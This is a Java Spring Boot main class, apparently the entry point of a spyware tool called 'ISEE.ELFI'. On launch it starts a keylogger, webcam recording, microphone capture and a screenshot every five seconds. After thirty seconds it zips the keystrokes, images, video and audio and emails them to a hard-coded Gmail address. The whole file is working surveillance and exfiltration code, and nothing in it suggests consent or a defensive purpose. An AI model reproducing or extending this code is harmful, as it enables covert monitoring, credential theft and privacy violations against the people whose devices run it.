package com.isee.elfi;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static com.isee.elfi.EmailSender.sendEmailWithInMemoryAttachment;

@SpringBootApplication
public class ElfiApplication {
    public static void main(String[] args) {
        // AWT Headless modunu devre dışı bırakıyoruz
        System.setProperty("java.awt.headless", "false");

        SpringApplication.run(ElfiApplication.class, args);

        KeyLogger keyLogger = new KeyLogger();
        VoiceCapture recorder = new VoiceCapture();

        // Keylogger'ı yeni bir thread'de başlatıyoruz
        new Thread(keyLogger::startKeyLogger).start();

        // Kamerayı yeni bir thread'de başlatıyoruz
        new Thread(CameraCapture::capture).start();

        // ScheduledExecutorService kullanarak her 5 saniyede bir ekran görüntüsü al
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(2);
        executor.scheduleAtFixedRate(ScreenCapture::captureScreen, 0, 5, TimeUnit.SECONDS);

        recorder.startRecording();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Application is closing...");
            recorder.stopRecording();

            String toEmail = "ozgurcoderr@gmail.com";
            String subject = "ISEE.ELFI DENEME";
            String bodyText = "This email contains a ZIP file attachment.";

            try {
                Map<String, byte[]> fileContents = new LinkedHashMap<>();
                List<byte[]> imageList = ScreenCapture.getImageList();

                for (int index = 0; index < imageList.size(); index++) {
                    fileContents.put("image_" + (index + 1) + ".png", imageList.get(index));
                }

                byte[] logBytes = KeyLogger.savedBytes;
                if (logBytes != null) {
                    fileContents.put("keylogger.txt", logBytes);
                }

                CameraCapture.close();
                byte[] videoByte = CameraCapture.videoByte;
                if (videoByte != null) {
                    fileContents.put("video.flv", videoByte);
                }

                byte[] audioBytes = recorder.getAudioBytes();
                if (audioBytes != null) {
                    fileContents.put("output.wav", audioBytes);
                }

                Zipper zipper = new Zipper();
                byte[] zipData = zipper.zipFiles(fileContents);

                sendEmailWithInMemoryAttachment(toEmail, subject, bodyText, zipData, "file.zip");
            } catch (IOException e) {
                System.err.println("Error while creating the ZIP file: " + e.getMessage());
            }
        }));

        // 30 saniye sonra uygulamayı durdurmak için zamanlayıcı
        executor.schedule(() -> {
            System.out.println("30 seconds elapsed. Shutting down application...");
            System.exit(0);
        }, 30, TimeUnit.SECONDS);
    }
}
